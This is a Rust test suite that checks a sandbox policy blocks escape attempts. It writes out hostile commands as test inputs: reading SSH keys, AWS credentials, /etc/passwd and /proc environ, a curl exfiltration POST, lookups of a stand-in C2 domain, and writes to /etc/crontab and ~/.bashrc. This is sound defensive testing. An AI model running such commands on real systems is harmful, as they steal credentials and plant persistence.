//! Sandbox Escape Test Suite
//!
//! Tests based on OWASP Agentic AI Top 10 (2026) and MITRE ATT&CK T1611.
//! These tests verify that the sandbox properly blocks container escape attempts.
//!
//! Run with: `cargo test --test sandbox_escape_test -- --nocapture`
//!
//! References:
//! - MITRE ATT&CK T1611: Escape to Host
//! - CVE-2025-31133: runC symlink to procfs
//! - CVE-2025-52565: Timing-based maskedPaths bypass

#![cfg(target_os = "macos")]

use transducer_sandbox::{Policy, Sandbox};

/// Helper to run a command in sandbox and return output
async fn run_sandboxed(policy: &Policy, cmd: &[&str]) -> (i32, String, String) {
    let socket_path = format!("/tmp/escape-test-{}", std::process::id());
    let sandbox = Sandbox::with_socket_path(policy.clone(), &socket_path).unwrap();

    let output = sandbox.run_with_output(cmd).await.unwrap();

    let _ = std::fs::remove_file(&socket_path);

    (output.exit_code, output.stdout, output.stderr)
}

/// Restrictive policy for escape testing
fn escape_test_policy() -> Policy {
    Policy::from_json(
        r#"{
        "version": "1",
        "filesystem": {
            "write": ["/tmp/sandbox-test-**"],
            "read": ["/usr/**", "/bin/**", "/tmp/**"],
            "deny": [
                "/etc/passwd",
                "/etc/shadow",
                "/proc/**",
                "/sys/**",
                "~/.ssh/**",
                "~/.aws/**",
                "~/.config/**"
            ]
        },
        "network": {
            "allow": []
        },
        "credentials": {
            "drop_capabilities": true,
            "no_new_privs": true
        }
    }"#,
    )
    .expect("Failed to parse escape test policy")
}

// =============================================================================
// PROCFS/SYSFS ACCESS TESTS (MITRE T1611)
// =============================================================================

/// Test: Block access to /proc/self/exe (process binary path)
#[tokio::test]
async fn test_block_proc_self_exe() {
    let policy = escape_test_policy();
    let (exit_code, stdout, stderr) = run_sandboxed(&policy, &["readlink", "/proc/self/exe"]).await;

    println!("=== Block /proc/self/exe ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    // Should fail - /proc access blocked
    assert_ne!(exit_code, 0, "Should block /proc/self/exe access");
}

/// Test: Block access to /proc/1/environ (init process environment)
#[tokio::test]
async fn test_block_proc_environ() {
    let policy = escape_test_policy();
    let (exit_code, stdout, stderr) =
        run_sandboxed(&policy, &["cat", "/proc/1/environ"]).await;

    println!("=== Block /proc/1/environ ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    assert_ne!(exit_code, 0, "Should block /proc/1/environ access");
    assert!(
        stdout.is_empty(),
        "Should not leak environment variables from /proc"
    );
}

/// Test: Block access to /sys/kernel (kernel parameters)
#[tokio::test]
async fn test_block_sys_kernel() {
    let policy = escape_test_policy();
    let (exit_code, stdout, stderr) =
        run_sandboxed(&policy, &["ls", "/sys/kernel"]).await;

    println!("=== Block /sys/kernel ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    assert_ne!(exit_code, 0, "Should block /sys/kernel access");
}

// =============================================================================
// SYMLINK ATTACK TESTS (CVE-2025-31133 style)
// =============================================================================

/// Test: Prevent symlink creation pointing to /etc/passwd
#[tokio::test]
async fn test_block_symlink_to_etc_passwd() {
    let policy = escape_test_policy();
    let target = format!("/tmp/sandbox-test-{}/passwd-link", std::process::id());

    // Try to create symlink to /etc/passwd
    let (exit_code, stdout, stderr) = run_sandboxed(
        &policy,
        &["sh", "-c", &format!("ln -s /etc/passwd {target} && cat {target}")],
    )
    .await;

    println!("=== Block symlink to /etc/passwd ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    // Even if symlink creation succeeds, reading should fail
    assert!(
        !stdout.contains("root:"),
        "Should not leak /etc/passwd contents via symlink"
    );

    // Cleanup
    let _ = std::fs::remove_file(&target);
}

/// Test: Prevent symlink traversal to read sensitive files
#[tokio::test]
async fn test_block_symlink_traversal() {
    let policy = escape_test_policy();
    let test_dir = format!("/tmp/sandbox-test-{}", std::process::id());
    let _ = std::fs::create_dir_all(&test_dir);

    // Create nested symlinks trying to escape
    let (exit_code, stdout, stderr) = run_sandboxed(
        &policy,
        &[
            "sh",
            "-c",
            &format!(
                "cd {test_dir} && ln -s ../../../etc/passwd escape && cat escape"
            ),
        ],
    )
    .await;

    println!("=== Block symlink traversal ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    assert!(
        !stdout.contains("root:"),
        "Should not allow symlink traversal to /etc/passwd"
    );

    // Cleanup
    let _ = std::fs::remove_dir_all(&test_dir);
}

// =============================================================================
// CREDENTIAL THEFT TESTS
// =============================================================================

/// Test: Block access to SSH private keys
#[tokio::test]
async fn test_block_ssh_key_access() {
    let policy = escape_test_policy();
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());

    let (exit_code, stdout, stderr) = run_sandboxed(
        &policy,
        &["cat", &format!("{home}/.ssh/id_rsa")],
    )
    .await;

    println!("=== Block SSH key access ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    assert_ne!(exit_code, 0, "Should block ~/.ssh access");
    assert!(
        !stdout.contains("PRIVATE KEY"),
        "Should not leak SSH private key"
    );
}

/// Test: Block access to AWS credentials
#[tokio::test]
async fn test_block_aws_credentials() {
    let policy = escape_test_policy();
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());

    let (exit_code, stdout, stderr) = run_sandboxed(
        &policy,
        &["cat", &format!("{home}/.aws/credentials")],
    )
    .await;

    println!("=== Block AWS credentials ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    assert_ne!(exit_code, 0, "Should block ~/.aws access");
    assert!(
        !stdout.contains("aws_secret_access_key"),
        "Should not leak AWS credentials"
    );
}

/// Test: Block access to environment variables via /proc
#[tokio::test]
async fn test_block_env_via_proc() {
    let policy = escape_test_policy();

    // Set a secret env var and try to read it via /proc
    let (exit_code, stdout, stderr) = run_sandboxed(
        &policy,
        &["sh", "-c", "cat /proc/self/environ | tr '\\0' '\\n'"],
    )
    .await;

    println!("=== Block env via /proc ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    // Should either fail or not show sensitive vars
    if exit_code == 0 {
        assert!(
            !stdout.contains("ANTHROPIC_API_KEY"),
            "Should not expose API keys via /proc/self/environ"
        );
    }
}

// =============================================================================
// NETWORK ESCAPE TESTS
// =============================================================================

/// Test: Block outbound network connections for data exfiltration
#[tokio::test]
async fn test_block_network_exfil() {
    let policy = escape_test_policy();

    // Try to exfiltrate data via curl
    let (exit_code, stdout, stderr) = run_sandboxed(
        &policy,
        &[
            "sh",
            "-c",
            "curl -s --max-time 2 https://httpbin.org/post -d 'secret=exfiltrated' 2>&1",
        ],
    )
    .await;

    println!("=== Block network exfiltration ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    // Should fail - no network access in policy
    assert_ne!(exit_code, 0, "Should block outbound network");
}

/// Test: Block DNS resolution for C2 communication
#[tokio::test]
async fn test_block_dns_resolution() {
    let policy = escape_test_policy();

    let (exit_code, stdout, stderr) = run_sandboxed(
        &policy,
        &["sh", "-c", "host evil-c2-server.com 2>&1 || nslookup evil-c2-server.com 2>&1"],
    )
    .await;

    println!("=== Block DNS resolution ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    // Should fail or timeout
    assert_ne!(exit_code, 0, "Should block DNS resolution");
}

// =============================================================================
// PRIVILEGE ESCALATION TESTS
// =============================================================================

/// Test: Prevent setuid binary execution
#[tokio::test]
async fn test_block_setuid_execution() {
    let policy = escape_test_policy();

    // Try to use sudo (setuid binary)
    let (exit_code, stdout, stderr) = run_sandboxed(
        &policy,
        &["sudo", "id"],
    )
    .await;

    println!("=== Block setuid execution ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    // Should fail - no_new_privs should block setuid
    assert_ne!(exit_code, 0, "Should block setuid binary execution");
}

/// Test: Prevent capability escalation
#[tokio::test]
async fn test_block_capability_escalation() {
    let policy = escape_test_policy();

    // Try to read capabilities (should show none or fail)
    let (exit_code, stdout, stderr) = run_sandboxed(
        &policy,
        &["sh", "-c", "cat /proc/self/status | grep -i cap"],
    )
    .await;

    println!("=== Check dropped capabilities ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    // If /proc is blocked, this fails (good)
    // If it succeeds, CapEff should be 0 or minimal
    if exit_code == 0 && stdout.contains("CapEff") {
        // Check that effective capabilities are minimal
        assert!(
            stdout.contains("CapEff:\t0") || stdout.contains("CapEff:\t00000000"),
            "Should have minimal effective capabilities"
        );
    }
}

// =============================================================================
// FILE SYSTEM ESCAPE TESTS
// =============================================================================

/// Test: Block writing to system directories
#[tokio::test]
async fn test_block_system_write() {
    let policy = escape_test_policy();

    let (exit_code, stdout, stderr) = run_sandboxed(
        &policy,
        &["sh", "-c", "echo 'malicious' > /etc/crontab 2>&1"],
    )
    .await;

    println!("=== Block system directory write ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    assert_ne!(exit_code, 0, "Should block writing to /etc");
}

/// Test: Block writing outside allowed paths
#[tokio::test]
async fn test_block_write_outside_allowed() {
    let policy = escape_test_policy();
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());

    let (exit_code, stdout, stderr) = run_sandboxed(
        &policy,
        &["sh", "-c", &format!("echo 'backdoor' > {home}/.bashrc 2>&1")],
    )
    .await;

    println!("=== Block write outside allowed paths ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    assert_ne!(exit_code, 0, "Should block writing to home directory");
}

// =============================================================================
// TIMING/RACE CONDITION TESTS (CVE-2025-52565 style)
// =============================================================================

/// Test: Rapid file creation shouldn't bypass sandbox
#[tokio::test]
async fn test_rapid_file_operations() {
    let policy = escape_test_policy();

    // Try rapid file operations that might exploit race conditions
    let (exit_code, stdout, stderr) = run_sandboxed(
        &policy,
        &[
            "sh",
            "-c",
            "for i in $(seq 1 100); do cat /etc/passwd 2>/dev/null && echo LEAKED; done",
        ],
    )
    .await;

    println!("=== Rapid file operations ===");
    println!("exit_code: {exit_code}");
    println!("stdout: {stdout}");
    println!("stderr: {stderr}");

    assert!(
        !stdout.contains("LEAKED"),
        "Rapid operations should not bypass sandbox"
    );
    assert!(
        !stdout.contains("root:"),
        "Should not leak /etc/passwd via race condition"
    );
}

// =============================================================================
// SUMMARY TEST
// =============================================================================

/// Run all escape attempts and summarize results
#[tokio::test]
async fn test_escape_summary() {
    println!("\n");
    println!("╔══════════════════════════════════════════════════════════════╗");
    println!("║           SANDBOX ESCAPE TEST SUMMARY                        ║");
    println!("╠══════════════════════════════════════════════════════════════╣");
    println!("║ Based on OWASP Agentic AI Top 10 (2026)                      ║");
    println!("║ and MITRE ATT&CK T1611 (Container Escape)                    ║");
    println!("╚══════════════════════════════════════════════════════════════╝");
    println!();

    let policy = escape_test_policy();
    let mut passed = 0;
    let mut failed = 0;

    let tests: Vec<(&str, &[&str], bool)> = vec![
        ("procfs access", &["cat", "/proc/1/environ"], true),
        ("sysfs access", &["ls", "/sys/kernel"], true),
        ("SSH key theft", &["cat", "~/.ssh/id_rsa"], true),
        ("passwd read", &["cat", "/etc/passwd"], true),
        ("network egress", &["curl", "-s", "https://example.com"], true),
        ("sudo execution", &["sudo", "id"], true),
        ("crontab write", &["sh", "-c", "echo x > /etc/crontab"], true),
    ];

    for (name, cmd, should_fail) in tests {
        let (exit_code, stdout, _stderr) = run_sandboxed(&policy, cmd).await;
        let blocked = exit_code != 0 || stdout.is_empty();
        let status = if blocked == should_fail {
            passed += 1;
            "PASS"
        } else {
            failed += 1;
            "FAIL"
        };
        println!("  [{status}] {name}: exit={exit_code}");
    }

    println!();
    println!("  Results: {passed} passed, {failed} failed");
    println!();

    assert_eq!(failed, 0, "Some escape attempts succeeded!");
}
